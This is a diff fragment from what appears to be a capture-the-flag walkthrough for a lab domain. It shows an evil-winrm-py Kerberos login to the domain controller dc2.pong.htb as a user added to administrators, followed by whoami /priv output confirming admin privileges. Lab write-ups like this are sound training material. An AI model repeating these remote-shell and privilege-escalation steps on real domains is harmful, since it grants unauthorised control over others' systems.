@@ -1023,5 +1023,49 @@ Ill then add `c.carlssen` to the administrators group
 Then after logging out of winrm and logging back in.....
 
 ```python
+❯❯❯ faketime -f +8h python3 venv/bin/evil-winrm-py -k -i dc2.pong.htb --no-pass                              
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.7.0
 
+[*] Connecting to 'dc2.pong.htb:5985' as 'c.carlssen@PONG.HTB'
+evil-winrm-py PS C:\Users\C.Carlssen\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+evil-winrm-py PS C:\Users\C.Carlssen\Documents>
 ```
+
+This user is now an admin on `dc2`
+
